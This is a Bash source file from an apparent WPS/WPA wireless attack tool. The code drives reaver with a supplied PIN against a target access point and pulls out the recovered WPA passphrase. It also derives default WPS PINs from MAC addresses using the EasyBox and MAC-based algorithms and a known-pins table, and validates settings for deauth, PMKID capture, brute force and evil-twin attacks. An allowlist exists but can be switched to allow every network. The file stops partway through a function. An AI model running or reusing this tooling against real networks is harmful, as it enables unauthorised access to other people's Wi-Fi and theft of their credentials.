declare -gA OUI_CACHE=()

function ts_now() {
	date -u +%FT%TZ 2>/dev/null || date -u
}

function audit_write() {
	if [[ -n "$LOG_AUDIT" && -w "$LOG_AUDIT" ]]; then
		printf '%s\n' "$1" >>"$LOG_AUDIT" 2>/dev/null || true
	fi
}

function audit_blank() {
	audit_write ""
}

function audit_header() {
	local title="$1"
	shift
	audit_blank
	audit_write "----- $title -----"
	while (($# > 0)); do
		audit_write "$1"
		shift
	done
	audit_write "------------------------------"
	audit_blank
}

function print_log() {
	local level="$1"
	local tag="$2"
	local msg="${3:-}"
	local out_msg
	out_msg="[$(ts_now)] [$level] [$tag] $msg"
	if [[ -n "$LOG_SESSION" && -w "$LOG_SESSION" ]]; then
		printf '%s\n' "$out_msg" >>"$LOG_SESSION" 2>/dev/null || true
	fi
	if [[ -n "$LOG_AUDIT" && -w "$LOG_AUDIT" ]]; then
		printf '%s\n' "$out_msg" >>"$LOG_AUDIT" 2>/dev/null || true
	fi
	case "$level" in
	INFO) printf '[%s%s%s] %s\n' "$C_GREY" "$tag" "$C_RESET" "$msg" ;;
	WARN) printf '[%s%s%s] %s\n' "$C_YELLOW" "$tag" "$C_RESET" "$msg" ;;
	ERROR) printf '[%s%s%s] %s\n' "$C_RED" "$tag" "$C_RESET" "$msg" ;;
	OK) printf '[%s%s%s] %s\n' "$C_GREEN" "$tag" "$C_RESET" "$msg" ;;
	VULN) printf '[%s%s%s%s] %s\n' "$C_RED" "$C_BOLD" "$tag" "$C_RESET" "$msg" ;;
	NET) printf '[%s%s%s] %s\n' "$C_CYAN" "$tag" "$C_RESET" "$msg" ;;
	*) printf '[%s] %s\n' "$tag" "$msg" ;;
	esac
	return 0
}

function log_target_detail() {
	local b="$1" essid="$2" sig="$3" ver="$4" chip="$5" cves="$6" pmf_mode="${7:-?}" akm="${8:-?}"
	audit_header "AP DETAIL" \
		"time        : $(ts_now)" "bssid       : $b" "essid       : $essid" \
		"signal      : $sig dBm" "wps_version : $ver" "chipset     : $chip" \
		"cves        : ${cves:-none}" "pmf_mode    : $pmf_mode" "akm         : $akm"
}

function log_attempt() {
	local b="$1" method="$2" status="$3" detail="$4"
	audit_header "ATTEMPT" \
		"time   : $(ts_now)" "bssid  : $b" "method : $method" \
		"status : $status" "detail : $detail"
	ATTEMPT_LOG+=("$b|$method|$status|$detail")
}

function run_cleanup() {
	local sig="${1:-EXIT}"
	if ((CLEAN_DONE == 1)); then return 0; fi
	CLEAN_DONE=1

	local restore="${RESTORE_TYPE:-managed}"
	if [[ "$CURRENT_MODE" != "$restore" ]]; then
		iface_set_type "$restore" 2>/dev/null || true
		CURRENT_MODE="$restore"
	fi

	print_log INFO CLEAN "Stop."

	local pid
	for pid in "$WPS_PID" "$CLI_PID" ${BG_PIDS[@]+"${BG_PIDS[@]}"}; do
		if [[ -n "$pid" ]] && kill -0 "$pid" 2>/dev/null; then
			kill -TERM "$pid" 2>/dev/null || true
		fi
	done
	sleep 0.5
	for pid in "$WPS_PID" "$CLI_PID" ${BG_PIDS[@]+"${BG_PIDS[@]}"}; do
		if [[ -n "$pid" ]] && kill -0 "$pid" 2>/dev/null; then
			kill -KILL "$pid" 2>/dev/null || true
		fi
	done
	BG_PIDS=()

	if [[ -n "${ORIGINAL_MAC:-}" ]]; then
		ip link set "$IFACE" down 2>/dev/null || true
		sleep 0.5
		ip link set "$IFACE" address "$ORIGINAL_MAC" 2>/dev/null || true
		ip link set "$IFACE" up 2>/dev/null || true
	fi

	if command -v nmcli &>/dev/null; then
		nmcli dev set "$IFACE" managed yes 2>/dev/null || true
	fi

	iface_set_type "$restore" 2>/dev/null || true

	if [[ -n "$LOG_SESSION" && -s "$LOG_SESSION" && -d "$LOG_DIR" ]]; then
		cp "$LOG_SESSION" "${LOG_DIR}/session_$(date +%Y%m%d_%H%M%S)_$$.log" 2>/dev/null || true
	fi

	if [[ -n "$TMP_DIR" && -d "$TMP_DIR" ]]; then
		rm -rf -- "$TMP_DIR"
	fi

	if [[ "$sig" == "EXIT" ]]; then
		print_log INFO STATS "scans=$SCAN_NUM try=$VECTORS_RUN hit=$HITS ap=$APS_SEEN"
	fi
}

trap 'run_cleanup EXIT' EXIT
trap 'run_cleanup INT; exit 130' INT
trap 'run_cleanup TERM; exit 143' TERM

function get_vendor() {
	local oui
	oui=$(normalize_oui "$1")
	printf '%s\n' "${OUI_TO_VENDOR["$oui"]:-unknown}"
}

function mark_known() {
	local b="$1" reason="${2:-}"
	if [[ -z "$b" ]]; then return 1; fi
	if [[ -z "${KNOWN_FILE:-}" ]]; then return 0; fi

	if [[ -f "$KNOWN_FILE" ]]; then
		grep -qxF "$b" "$KNOWN_FILE" 2>/dev/null || printf '%s\n' "$b" >>"$KNOWN_FILE" || true
	else
		printf '%s\n' "$b" >"$KNOWN_FILE" 2>/dev/null || true
	fi

	if [[ -n "$reason" ]]; then
		log_attempt "$b" "mark_known" "SKIP" "$reason"
	fi
	return 0
}

# --- Report dedup history (persistent, per network, BSSID-keyed) --------------
# Two flat files in LOG_DIR hold already-reported BSSIDs, one per line, lower-
# case normalized: recon_reported.txt and vuln_reported.txt. Independent states
# (a network in recon history may still be new to the vuln report). All updates
# happen under flock (fd 201) and only AFTER the HTML is confirmed written.

function report_state_norm() {
	local b
	b="$(normalize_bssid "${1:-}" 2>/dev/null)" || b=""
	if [[ -n "$b" ]]; then
		printf '%s' "$b"
	else
		printf '%s' "${1,,}"
	fi
}

function report_state_seen() {
	local f="${1:-}" b
	b="$(report_state_norm "${2:-}")"
	[[ -n "$f" && -f "$f" && -n "$b" ]] || return 1
	grep -qxF "$b" "$f" 2>/dev/null
}

function report_state_add() {
	local f="${1:-}"
	shift || true
	[[ -n "$f" ]] || return 0
	mkdir -p "$(dirname "$f")" 2>/dev/null || true
	(
		flock -x 201 2>/dev/null || true
		local b
		for b in "$@"; do
			b="$(report_state_norm "$b")"
			[[ -n "$b" ]] || continue
			if [[ -f "$f" ]] && grep -qxF "$b" "$f" 2>/dev/null; then continue; fi
			printf '%s\n' "$b" >>"$f" 2>/dev/null || true
		done
	) 201>"${f}.lock" 2>/dev/null || true
	return 0
}


function report_state_init() {
	local pf b rh mac
	if [[ -n "${REPORT_STATE_VULN:-}" && ! -f "$REPORT_STATE_VULN" ]]; then
		: >"$REPORT_STATE_VULN" 2>/dev/null || true
		for pf in "${HASH_DIR:-$LOG_DIR}"/proof_*.conf; do
			[[ -e "$pf" ]] || continue
			b="$(grep -m1 '^# bssid:' "$pf" 2>/dev/null | sed 's/^# bssid:[[:space:]]*//')" || b=""
			[[ -n "$b" ]] && report_state_add "$REPORT_STATE_VULN" "$b"
		done
		print_log INFO REPORT "vuln history: $(grep -c . "$REPORT_STATE_VULN" 2>/dev/null || echo 0) net"
	fi
	if [[ -n "${REPORT_STATE_RECON:-}" && ! -f "$REPORT_STATE_RECON" ]]; then
		: >"$REPORT_STATE_RECON" 2>/dev/null || true
		for rh in "${LOG_DIR}"/report_recon_*.html; do
			[[ -e "$rh" ]] || continue
			while read -r mac; do
				[[ -n "$mac" ]] && report_state_add "$REPORT_STATE_RECON" "$mac"
			done < <(grep -oE '[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}' "$rh" 2>/dev/null | sort -u || true)
		done
		print_log INFO REPORT "recon history: $(grep -c . "$REPORT_STATE_RECON" 2>/dev/null || echo 0) net"
	fi
	return 0
}

function get_vendor_lock_type() {
	local vendor
	vendor=$(get_vendor "$1")
	if [[ " $PERMANENT_LOCK_VENDORS " == *" $vendor "* ]]; then
		printf 'permanent\n'
	elif [[ "$vendor" == "ubiquiti" || "$vendor" == "broadcom" || "$vendor" == "mediatek" ]]; then
		printf 'transient\n'
	else
		printf 'unknown\n'
	fi
}

function append_pins_from_mac_sources() {
	local -n _target=$1
	local b="$2"
	local oui line dp ep

	oui=$(normalize_oui "$b")
	if [[ -n "${KNOWN_PINS_DB["$oui"]:-}" ]]; then
		local -a db_pins=()
		IFS=' ' read -r -a db_pins <<<"${KNOWN_PINS_DB["$oui"]}"
		local p
		for p in "${db_pins[@]}"; do
			if [[ -n "$p" ]]; then _target+=("$p"); fi
		done
	fi

	if dp=$(pin_from_mac "$b" 2>/dev/null); then
		while IFS= read -r line; do
			if [[ -n "$line" ]]; then _target+=("$line"); fi
		done <<<"$dp"
	fi

	if ep=$(easybox_pin "$b" 2>/dev/null); then
		while IFS= read -r line; do
			if [[ -n "$line" ]]; then _target+=("$line"); fi
		done <<<"$ep"
	fi

	return 0
}

function attack_user_pin() {
	local b="$1" chip="$2" ver="${3:-}" pin="$4"
	local ok=0
	print_log INFO USERPIN "Try PIN $b"
	log_attempt "$b" "user_pin" "START" "pin=$pin"

	if [[ "${ENABLE_DRY_RUN:-0}" == "1" ]]; then
		print_log WARN USERPIN "Dry run"
		log_attempt "$b" "user_pin" "SKIP" "dry-run"
		return 1
	fi

	if [[ ! "$pin" =~ ^[0-9]{8}$ ]]; then
		print_log ERROR USERPIN "Bad PIN."
		log_attempt "$b" "user_pin" "FAIL" "invalid pin format"
		return 1
	fi

	if ! pin_check "$pin"; then
		print_log WARN USERPIN "Bad checksum"
	fi

	if ! command -v reaver &>/dev/null; then
		print_log ERROR USERPIN "No reaver"
		log_attempt "$b" "user_pin" "FAIL" "no reaver"
		return 1
	fi

	if ! ensure_mode "monitor"; then
		log_attempt "$b" "user_pin" "FAIL" "mode switch error"
		return 1
	fi

	trap 'ensure_mode "managed" 2>/dev/null || true' INT TERM RETURN
	iface_set_channel "$CUR_CHANNEL" 2>/dev/null || true
	sleep 0.5

	local flog tsf
	tsf=$(date +%s)
	flog="${TMP_DIR}/userpin_${b//:/}_${tsf}.log"
	: >"$flog"

	timeout -k 5 20 reaver -i "$IFACE" -b "$b" -c "$CUR_CHANNEL" \
		-p "$pin" -F -w -N -T 5 -vv >"$flog" 2>&1 || true

	local psk=""
	if grep -qE '\[\+\] WPS PIN:' "$flog" 2>/dev/null || grep -qiE 'WPA PSK:' "$flog" 2>/dev/null; then
		psk=$(grep -iE 'WPA PSK:' "$flog" 2>/dev/null | head -n1 | sed -E "s/.*WPA PSK:[[:space:]]*['\"]?([^'\"[:space:]]+)['\"]?.*/\1/")
		print_log VULN HACKED "Got PIN."
		save_proof "$b" "$chip" "$pin" "${psk:-unknown}" "user_pin"
		HITS=$((HITS + 1))
		ok=1
	else
		local st
		st=$(lock_state "$flog")
		if [[ "$st" != "none" ]]; then
			do_backoff "$b" "$st"
			log_attempt "$b" "user_pin" "FAIL" "lock=$st"
		else
			log_attempt "$b" "user_pin" "FAIL" "PIN rejected"
		fi
	fi

	ensure_mode "managed" 2>/dev/null || true
	trap - INT TERM RETURN
	return $((ok ? 0 : 1))
}

function check_bssid() {
	[[ "$1" =~ ^([0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}$ ]]
}

function validate_positive_int() {
	local name="$1" val="$2" min="${3:-1}" max="${4:-86400}"
	if [[ ! "$val" =~ ^[0-9]+$ ]]; then
		print_log ERROR FATAL "$name must be a number (got ${val:-empty})"
		exit 1
	fi
	if ((val < min || val > max)); then
		print_log ERROR FATAL "$name must be $min-$max (got $val)"
		exit 1
	fi
}

function validate_env() {
	if [[ ! "$IFACE" =~ ^[a-zA-Z0-9._-]{1,32}$ ]]; then
		print_log ERROR FATAL "Bad iface: $IFACE"
		exit 1
	fi
	if [[ "$LOG_DIR" == *".."* || "$LOG_DIR" == "-"* ]]; then
		print_log ERROR FATAL "Bad log dir: $LOG_DIR"
		exit 1
	fi

	REG_DOMAIN="${REG_DOMAIN^^}"
	if [[ ! "$REG_DOMAIN" =~ ^[A-Z]{2}$ ]]; then
		print_log WARN INIT "Bad country code; use $DEF_REG_DOMAIN"
		REG_DOMAIN="$DEF_REG_DOMAIN"
	fi

	validate_positive_int SCAN_TIMEOUT "$SCAN_TIMEOUT" 5 3600
	validate_positive_int BASE_LOCK_DELAY "$BASE_LOCK_DELAY" 1 600
	validate_positive_int MAX_LOCK_DELAY "$MAX_LOCK_DELAY" 1 3600
	validate_positive_int PIXIE_TIMEOUT "$PIXIE_TIMEOUT" 5 600
	validate_positive_int COOLDOWN "$COOLDOWN" 0 86400
	validate_positive_int MAX_CORES "$MAX_CORES" 1 64
	validate_positive_int MAX_TARGETS "$MAX_TARGETS" 1 1000
	validate_positive_int LOCK_WEAK_THRESHOLD "$LOCK_WEAK_THRESHOLD" 1 3600
	validate_positive_int LOCK_PROBE_TIMEOUT "$LOCK_PROBE_TIMEOUT" 10 3600
	validate_positive_int SPLIT_TIMEOUT "$SPLIT_TIMEOUT" 60 86400
	validate_positive_int MAC_ROTATE_DELAY "$MAC_ROTATE_DELAY" 0 30
	validate_positive_int IFACE_RETRIES "$IFACE_RETRIES" 1 10
	validate_positive_int DISABLE_DIAG_MONITOR_TEST "$DISABLE_DIAG_MONITOR_TEST" 0 1

	if [[ -n "${RSSI_ATTACK_MIN:-}" ]]; then
		if [[ ! "$RSSI_ATTACK_MIN" =~ ^-?[0-9]+$ ]]; then
			print_log ERROR FATAL "RSSI_ATTACK_MIN must be integer dBm (got ${RSSI_ATTACK_MIN})"
			exit 1
		fi
		if ((RSSI_ATTACK_MIN < -100 || RSSI_ATTACK_MIN > -1)); then
			print_log ERROR FATAL "RSSI_ATTACK_MIN must be -100..-1 dBm (got $RSSI_ATTACK_MIN)"
			exit 1
		fi
	fi

	validate_positive_int ENABLE_MOBILE_REEVAL "${ENABLE_MOBILE_REEVAL:-0}" 0 1
	validate_positive_int REEVAL_RSSI_IMPROVE_DB "${REEVAL_RSSI_IMPROVE_DB:-6}" 3 20
	validate_positive_int REEVAL_TTL_SEC "${REEVAL_TTL_SEC:-300}" 60 3600
	validate_positive_int ENABLE_PMKID "${ENABLE_PMKID:-1}" 0 1
	validate_positive_int PMKID_TIMEOUT "${PMKID_TIMEOUT:-10}" 5 60
	validate_positive_int ENABLE_EAPOL_PASSIVE "${ENABLE_EAPOL_PASSIVE:-1}" 0 1
	validate_positive_int ENABLE_WPA_BRUTE "${ENABLE_WPA_BRUTE:-1}" 0 1
	validate_positive_int WPA_BRUTE_MAX "${WPA_BRUTE_MAX:-30}" 1 1000000
	validate_positive_int WPA_BRUTE_TRY_SECS "${WPA_BRUTE_TRY_SECS:-8}" 3 60
	validate_positive_int EAPOL_PASSIVE_TIMEOUT "${EAPOL_PASSIVE_TIMEOUT:-30}" 10 120
	validate_positive_int ENABLE_PMKID_ACTIVE "${ENABLE_PMKID_ACTIVE:-0}" 0 1
	validate_positive_int PMKID_ACTIVE_TIMEOUT "${PMKID_ACTIVE_TIMEOUT:-15}" 5 120
	validate_positive_int ENABLE_DEAUTH "${ENABLE_DEAUTH:-0}" 0 1
	validate_positive_int ENABLE_DEAUTH_BROADCAST "${ENABLE_DEAUTH_BROADCAST:-0}" 0 1
	validate_positive_int DEAUTH_BURST "${DEAUTH_BURST:-5}" 1 30
	validate_positive_int DEAUTH_MAX_CLIENTS "${DEAUTH_MAX_CLIENTS:-3}" 1 10
	validate_positive_int DEAUTH_CAPTURE_SECS "${DEAUTH_CAPTURE_SECS:-20}" 8 90
	validate_positive_int DEAUTH_CLIENT_SCAN_SECS "${DEAUTH_CLIENT_SCAN_SECS:-6}" 3 30
	validate_positive_int ENABLE_SAE_PROBE "${ENABLE_SAE_PROBE:-0}" 0 1
	validate_positive_int DPP_SNIFF_SECS "${DPP_SNIFF_SECS:-8}" 1 600

	validate_positive_int ENABLE_WPA_AUDIT "${ENABLE_WPA_AUDIT:-0}" 0 1
	validate_positive_int WPA_AUDIT_TIMEOUT "${WPA_AUDIT_TIMEOUT:-300}" 10 86400
	validate_positive_int WPA_AUDIT_THREADS "${WPA_AUDIT_THREADS:-1}" 1 8
	validate_positive_int WPA_AUDIT_REQUIRE_ALLOWLIST "${WPA_AUDIT_REQUIRE_ALLOWLIST:-1}" 0 1

	validate_positive_int ENABLE_EVILTWIN "${ENABLE_EVILTWIN:-0}" 0 1
	validate_positive_int EVILTWIN_TIMEOUT "${EVILTWIN_TIMEOUT:-120}" 20 1800
	validate_positive_int EVILTWIN_DEAUTH "${EVILTWIN_DEAUTH:-0}" 0 1
	case "${EVILTWIN_TOOL:-}" in
	"" | eaphammer | hostapd-wpe | hostapd_wpe) ;;
	*)
		print_log ERROR FATAL "EVILTWIN_TOOL must be eaphammer or hostapd-wpe (got ${EVILTWIN_TOOL})"
		exit 1
		;;
	esac

	case "${WPA_AUDIT_MODE,,}" in
	passive | external)
		;;
	*)
		print_log ERROR FATAL "WPA_AUDIT_MODE must be passive or external (got ${WPA_AUDIT_MODE:-})"
		exit 1
		;;
	esac

	if [[ "${WPA_AUDIT_MODE,,}" == "external" ]]; then
		if [[ -n "${WPA_AUDIT_EXTERNAL_TOOL:-}" && ! -x "${WPA_AUDIT_EXTERNAL_TOOL}" ]]; then
			print_log WARN INIT "WPA_AUDIT_EXTERNAL_TOOL is not executable: ${WPA_AUDIT_EXTERNAL_TOOL}"
		fi

		if [[ -n "${WPA_AUDIT_WORDLIST:-}" && ! -r "${WPA_AUDIT_WORDLIST}" ]]; then
			print_log WARN INIT "WPA_AUDIT_WORDLIST is not readable: ${WPA_AUDIT_WORDLIST}"
		fi
	fi

	if [[ -n "${USER_PROVIDED_PIN:-}" && ! "$USER_PROVIDED_PIN" =~ ^[0-9]{8}$ ]]; then
		print_log ERROR FATAL "PIN must be 8 digits"
		exit 1
	fi
}

pin_check() {
	local p="$1"
	[[ $p =~ ^[0-9]{8}$ ]] || return 1
	[[ "$(wps_checksum "${p:0:7}")" == "${p:7:1}" ]]
}

function wps_checksum() {
	local pin="$1"
	if [[ ! "$pin" =~ ^[0-9]{1,8}$ ]]; then return 1; fi
	pin=$((10#${pin:0:7}))
	local d0=$((pin / 1000000 % 10)) d1=$((pin / 100000 % 10))
	local d2=$((pin / 10000 % 10)) d3=$((pin / 1000 % 10))
	local d4=$((pin / 100 % 10)) d5=$((pin / 10 % 10)) d6=$((pin % 10))
	local sum=$((3 * (d0 + d2 + d4 + d6) + (d1 + d3 + d5)))
	echo $(((10 - (sum % 10)) % 10))
}

function normalize_bssid() {
	local raw="${1:-}" mac=""
	raw="${raw,,}"
	if [[ "$raw" == *[:-]* ]]; then
		raw="${raw//-/:}"
		local -a oct=()
		IFS=':' read -r -a oct <<<"$raw"
		[[ ${#oct[@]} -eq 6 ]] || { printf ''; return 1; }
		local part
		for part in "${oct[@]}"; do
			[[ "$part" =~ ^[0-9a-f]{1,2}$ ]] || { printf ''; return 1; }
			[[ ${#part} -eq 1 ]] && part="0$part"
			mac+="$part"
		done
	else
		mac="$raw"
	fi
	if [[ ! "$mac" =~ ^[0-9a-f]{12}$ ]]; then
		printf ''
		return 1
	fi
	printf '%s:%s:%s:%s:%s:%s\n' \
		"${mac:0:2}" "${mac:2:2}" "${mac:4:2}" "${mac:6:2}" "${mac:8:2}" "${mac:10:2}"
	return 0
}

function normalize_oui() {
	local raw="${1:-}" nb mac
	nb=$(normalize_bssid "$raw" 2>/dev/null) || nb=""
	if [[ -n "$nb" ]]; then
		printf '%s\n' "${nb:0:8}"
		return 0
	fi
	if [[ "$raw" != *[:-]* ]]; then
		mac="${raw,,}"
		if [[ "${mac:0:6}" =~ ^[0-9a-f]{6}$ ]]; then
			printf '%s:%s:%s\n' "${mac:0:2}" "${mac:2:2}" "${mac:4:2}"
			return 0
		fi
	fi
	printf 'unknown\n'
	return 0
}

function allowlist_add_token() {
	local -n _al_map=$1
	local raw="${2:-}" nb
	raw="${raw#"${raw%%[![:space:]]*}"}"
	raw="${raw%"${raw##*[![:space:]]}"}"
	[[ -n "$raw" ]] || return 0

	nb=$(normalize_bssid "$raw" 2>/dev/null) || nb=""
	if [[ -z "$nb" ]]; then
		print_log WARN ALLOWLIST "Skip BSSID $raw"
		return 1
	fi
	_al_map["$nb"]=1
	return 0
}

function allowlist_load_file() {
	local -n _al_fmap=$1
	local path="${2:-}" line
	[[ -n "$path" ]] || return 1
	if [[ ! -f "$path" ]]; then
		print_log WARN ALLOWLIST "No allowlist $path"
		return 1
	fi
	while IFS= read -r line || [[ -n "$line" ]]; do
		line="${line#"${line%%[![:space:]]*}"}"
		line="${line%"${line##*[![:space:]]}"}"
		[[ -z "$line" || "$line" == \#* ]] && continue
		allowlist_add_token _al_fmap "$line" || true
	done <"$path"
	return 0
}

function allowlist_load_csv() {
	local -n _al_cmap=$1
	local csv="${2:-}" tok
	local -a tokens=()
	[[ -n "$csv" ]] || return 0
	IFS=',' read -r -a tokens <<<"$csv"
	for tok in "${tokens[@]}"; do
		allowlist_add_token _al_cmap "$tok" || true
	done
	return 0
}


function allowlist_init_active() {

    if [[ "${ALLOW_ALL_TARGETS:-0}" == "1" ]]; then
        ACTIVE_ALLOWLIST_STATE="allow_all"
        print_log INFO ALLOWLIST "All networks allowed"
        return 0
    fi
    # ==============================================

    ACTIVE_ALLOWLIST=()
    local env_set=0 file_set=0
    [[ -v ACTIVE_BSSID_ALLOWLIST ]] && env_set=1
    [[ -v ACTIVE_ALLOWLIST_FILE ]] && file_set=1

    if ((env_set == 0 && file_set == 0)); then
        ACTIVE_ALLOWLIST_STATE="absent"
        return 0
    fi

    if ((env_set)); then
        allowlist_load_csv ACTIVE_ALLOWLIST "${ACTIVE_BSSID_ALLOWLIST}"
    fi
    if ((file_set)); then
        allowlist_load_file ACTIVE_ALLOWLIST "${ACTIVE_ALLOWLIST_FILE}" || true
    fi

    if ((${#ACTIVE_ALLOWLIST[@]} == 0)); then
        ACTIVE_ALLOWLIST_STATE="empty"
        print_log WARN ALLOWLIST "List empty"
    else
        ACTIVE_ALLOWLIST_STATE="present"
        print_log INFO ALLOWLIST "List loaded (${#ACTIVE_ALLOWLIST[@]})"
    fi
    return 0
}

function eviltwin_essid_add_token() {
	local -n _et_map=$1
	local raw="${2:-}"
	raw="${raw#"${raw%%[![:space:]]*}"}"
	raw="${raw%"${raw##*[![:space:]]}"}"
	[[ -n "$raw" ]] || return 0
	_et_map["$raw"]=1
	return 0
}

function eviltwin_allowlist_init() {
	EVILTWIN_ALLOWLIST=()
	local env_set=0 file_set=0 line tok
	local -a tokens=()
	[[ -v EVILTWIN_ESSID_ALLOWLIST ]] && env_set=1
	[[ -v EVILTWIN_ESSID_ALLOWLIST_FILE ]] && file_set=1

	if ((env_set == 0 && file_set == 0)); then
		EVILTWIN_ALLOWLIST_STATE="absent"
		return 0
	fi

	if ((env_set)); then
		IFS=',' read -r -a tokens <<<"${EVILTWIN_ESSID_ALLOWLIST}"
		for tok in "${tokens[@]}"; do
			eviltwin_essid_add_token EVILTWIN_ALLOWLIST "$tok"
		done
	fi
	if ((file_set)); then
		if [[ -f "${EVILTWIN_ESSID_ALLOWLIST_FILE}" ]]; then
			while IFS= read -r line || [[ -n "$line" ]]; do
				line="${line#"${line%%[![:space:]]*}"}"
				line="${line%"${line##*[![:space:]]}"}"
				[[ -z "$line" || "$line" == \#* ]] && continue
				eviltwin_essid_add_token EVILTWIN_ALLOWLIST "$line"
			done <"${EVILTWIN_ESSID_ALLOWLIST_FILE}"
		else
			print_log WARN EVILTWIN "No ESSID list"
		fi
	fi

	if ((${#EVILTWIN_ALLOWLIST[@]} == 0)); then
		EVILTWIN_ALLOWLIST_STATE="empty"
		print_log WARN EVILTWIN "ESSID list empty"
	else
		EVILTWIN_ALLOWLIST_STATE="present"
		print_log INFO EVILTWIN "ESSID list loaded"
	fi
	return 0
}

function eviltwin_essid_allowlisted() {
	local e="${1:-}"
	[[ -n "${SCOPE_ESSID_PREFIX:-}" && "$e" == "${SCOPE_ESSID_PREFIX}"* ]] && return 0
	[[ "${SCOPE_ALL_AUTHORIZED:-0}" == "1" ]] && return 0
	[[ -n "$e" ]] || return 1
	case "${EVILTWIN_ALLOWLIST_STATE:-absent}" in
	present)
		[[ -n "${EVILTWIN_ALLOWLIST[$e]:-}" ]] && return 0
		return 1
		;;
	*) return 1 ;;
	esac
}

function is_wpa_enterprise() {
	local akm="${1:-}"
	[[ ",${akm}," == *802.1X* || ",${akm}," == *FILS* ]]
}

function active_attack_permitted() {
    local nb
    nb=$(normalize_bssid "${1:-}" 2>/dev/null) || nb=""
    [[ -n "$nb" ]] || return 1

    [[ -n "${IN_SCOPE_BSSIDS[$nb]:-}" ]] && return 0
    [[ "${SCOPE_ALL_AUTHORIZED:-0}" == "1" ]] && return 0

    case "${ACTIVE_ALLOWLIST_STATE:-absent}" in
    allow_all)

        return 0
        ;;
    present)
        [[ -n "${ACTIVE_ALLOWLIST[$nb]:-}" ]] && return 0
        return 1
        ;;
    *) return 1 ;;
    esac
}

function get_chip() {
	local oui vendor chipset
	oui=$(normalize_oui "$1")
	if [[ -n "${OUI_CACHE["$oui"]:-}" ]]; then
		printf '%s\n' "${OUI_CACHE["$oui"]}"
		return 0
	fi
	vendor="${OUI_TO_VENDOR["$oui"]:-unknown}"
	chipset="${VENDOR_TO_LIKELY_CHIPSET["$vendor"]:-unknown}"
	OUI_CACHE["$oui"]="$chipset"
	printf '%s\n' "$chipset"
}

function get_cves() {
	if [[ -z "${1:-}" || "$1" == "unknown" ]]; then
		printf '\n'
		return 0
	fi
	printf '%s\n' "${CHIPSET_CVES["$1"]:-}"
}

function pin_from_mac() {
	local h="${1//[-:]/}"
	if [[ ! "$h" =~ ^[0-9a-fA-F]{12}$ ]]; then return 1; fi

	local nic="${h:6:6}"
	local num_be=$((16#$nic))
	local pref_be=$((num_be % 10000000))
	printf "%07d%d\n" "$pref_be" "$(wps_checksum "$pref_be")"

	local b0="${nic:0:2}" b1="${nic:2:2}" b2="${nic:4:2}"
	local rev="${b2}${b1}${b0}"
	local num_le=$((16#$rev))
	local pref_le=$((num_le % 10000000))
	if [[ "$pref_le" -ne "$pref_be" ]]; then
		printf "%07d%d\n" "$pref_le" "$(wps_checksum "$pref_le")"
	fi

	return 0
}

function easybox_pin() {
	local mac="$1"
	local mac_hex="${mac//[-:]/}"
	if [[ ! "$mac_hex" =~ ^[0-9a-fA-F]{12}$ ]]; then return 1; fi

	local sn_num=$((16#${mac_hex:8:4}))
	local sn
	printf -v sn "R----%05d" "$sn_num"

	local -a mac_int=()
	local i
	for ((i = 0; i < 12; i++)); do mac_int[i]=$((16#${mac_hex:$i:1})); done

	local -a sn_int=(0 0 0 0 0)
	for ((i = 0; i < 5; i++)); do sn_int[i + 5]=${sn:$((i + 5)):1}; done

	local k1=$(((sn_int[6] + sn_int[7] + mac_int[10] + mac_int[11]) & 0xF))
	local k2=$(((sn_int[8] + sn_int[9] + mac_int[8] + mac_int[9]) & 0xF))

	local -a hpin=()
	hpin[0]=$((k1 ^ sn_int[9]))
	hpin[1]=$((k1 ^ sn_int[8]))
	hpin[2]=$((k2 ^ mac_int[9]))
	hpin[3]=$((k2 ^ mac_int[10]))
	hpin[4]=$((mac_int[10] ^ sn_int[9]))
	hpin[5]=$((mac_int[11] ^ sn_int[8]))
	hpin[6]=$((k1 ^ sn_int[7]))

	local hex_str
	printf -v hex_str "%1X%1X%1X%1X%1X%1X%1X" \
		"${hpin[0]}" "${hpin[1]}" "${hpin[2]}" "${hpin[3]}" \
		"${hpin[4]}" "${hpin[5]}" "${hpin[6]}"

	local pin7=$((16#$hex_str % 10000000))
	local d0=$((pin7 / 1000000 % 10)) d1=$((pin7 / 100000 % 10)) d2=$((pin7 / 10000 % 10))
	local d3=$((pin7 / 1000 % 10)) d4=$((pin7 / 100 % 10)) d5=$((pin7 / 10 % 10)) d6=$((pin7 % 10))
	local sum=$((3 * (d0 + d2 + d4 + d6) + (d1 + d3 + d5)))
	local cs=$(((10 - (sum % 10)) % 10))

	printf "%07d%d\n" "$pin7" "$cs"
	return 0
}

function pin_entropy_class() {
	local p="${1:0:7}"
	if [[ ! "$p" =~ ^[0-9]{7}$ ]]; then
		printf 'normal\n'
		return 0
	fi

	case "$p" in
	0000000 | 1111111 | 2222222 | 3333333 | 4444444 | 5555555 | 6666666 | 7777777 | 8888888 | 9999999 | \
		1234567 | 0123456 | 7654321 | 6543210 | 1111112 | 1222222 | 9876543 | 1357911 | 2468024 | \
		1212121 | 1231231 | 1112223)
		printf 'trivial\n'
		return 0
		;;
	esac

	local uniq
	uniq=$(printf '%s\n' "$p" | awk '{for(i=1;i<=length($0);i++) a[substr($0,i,1)]} END {print length(a)}')
	if [[ "$uniq" -le 2 ]]; then
		printf 'trivial\n'
		return 0
	fi
	if [[ "$uniq" -le 3 ]]; then
		printf 'weak\n'
		return 0
	fi

	printf 'normal\n'
	return 0
}

function measure_lockout_strength() {
	local b="$1" channel="$2"
	if [[ "${ENABLE_LOCK_PROBE:-0}" != "1" ]]; then
		printf 'unknown\n'
		return 0
	fi

	local thr=${LOCK_WEAK_THRESHOLD:-120}
	local probe_to=${LOCK_PROBE_TIMEOUT:-180}
	local end
	end=$(($(date +%s) + probe_to))
	local start
	start=$(date +%s)

	ensure_mode "managed" 2>/dev/null || true
	iface_set_channel "$channel" 2>/dev/null || true

	while (($(date +%s) < end)); do
		local dump
		dump=$(timeout 6 iw dev "$IFACE" scan 2>/dev/null) || true
		if ! awk -v bss="$b" '/^BSS /{inb=(index($2,bss)==1)} inb&&/[Ss]etup [Ll]ocked:[[:space:]]*0x0*[1-9a-fA-F]/{found=1} END{exit found?0:1}' <<<"$dump"; then
			local elapsed
			elapsed=$(($(date +%s) - start))
			if ((elapsed <= thr)); then
				printf 'weak\n'
			else
				printf 'strong\n'
			fi
			return 0
		fi
		sleep 5
	done

	printf 'strong\n'
}

function detect_dpp_vulns() {
	local b="$1" dpp_ver="${2:-unknown}" dpp_conf="${3:-NO}" dpp_pkex="${4:-NO}" maker="${5:-}" model="${6:-}" fw="${7:-}"
	local -a hits=()
	local blob
